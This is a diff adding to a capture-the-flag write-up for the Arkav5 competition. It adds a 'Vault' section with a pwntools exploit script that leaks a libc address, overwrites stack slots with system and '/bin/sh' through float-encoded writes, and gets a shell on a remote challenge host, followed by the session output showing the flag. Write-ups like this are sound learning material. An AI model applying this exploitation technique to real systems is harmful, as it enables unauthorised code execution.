@@ -621,5 +621,86 @@ And here is the interaction after `exploit3.py` executed
 
 [+] Flag: Arkav5{0ff_13y_0n3_3xpl01t3d}
 ```
+
+PS: this is not the intended solution and it need more than 1 hour to solve it :v.
+
 flag: `Arkav5{0ff_13y_0n3_3xpl01t3d}`
+
+
+## Vault
+
+- attachment: [vault](vault/vault)
+
+We can write in address around stack. Leak libc_start_main return in 34th index and we know that libc used by server is 2.23. Edit 34th index to be system and 36th address to address of "/bin/sh" string in libc. When the program return from main, we will get shell.
+
+`exploit.py`
 ```
+import struct
+from pwn import *
+
+# bikin perintahnya tidak terbatas
+
+offset_bin_sh = 0x15ba0b
+offset_system =  0x03ada0
+offset_lsm_ret = 0x18637
+
+r = remote('167.205.35.176', 31003)
+# r = process('./vault'); gdb.attach(r, ' b *0x080486c8')
+# cek versi libc
+r.sendlineafter('> ', '1')
+r.sendlineafter(' : ', '34')
+# r.interactive()
+print r.recvuntil(':')
+bil = r.recvline()
+print bil
+print float(bil)
+njing_s = struct.pack('<f', float(bil))
+njing_addr = u32(njing_s)
+print hex(njing_addr)
+
+system = njing_addr - offset_lsm_ret + offset_system
+bin_sh = njing_addr - offset_lsm_ret + offset_bin_sh
+
+print '%f' % struct.unpack('<f', p32(system))[0]
+print '%f' % struct.unpack('<f', p32(bin_sh))[0]
+
+
+r.interactive()
+```
+
+And here is the interaction
+```
+$ python exploit.py 
+[+] Opening connection to 167.205.35.176 on port 31003: Done
+Kotak-34 :
+ -4297827925424323431078164992884736.000000
+
+-4.29782792542e+33
+0xf753e637
+-4341515138895714322324423811530752.000000
+-4707582364607666445928950413656064.000000
+[*] Switching to interactive mode
+List perintah
+1. Baca isi kotak
+2. Tulis ke kotak
+3. Keluar
+Banyak perintah tersisa : 2
+> $ 2
+Masukkan no kotak : $ 34
+Masukkan isi baru : $ -4341515138895714322324423811530752.000000
+List perintah
+1. Baca isi kotak
+2. Tulis ke kotak
+3. Keluar
+Banyak perintah tersisa : 1
+> $ 2
+Masukkan no kotak : $ 36
+Masukkan isi baru : $ -4707582364607666445928950413656064.000000
+$ ls
+flag
+run.sh
+vault
+$ cat flag
+Arkav5{Wr1t3_d4ta_us1ng_fl0at}
+```
+flag: `Arkav5{Wr1t3_d4ta_us1ng_fl0at}`
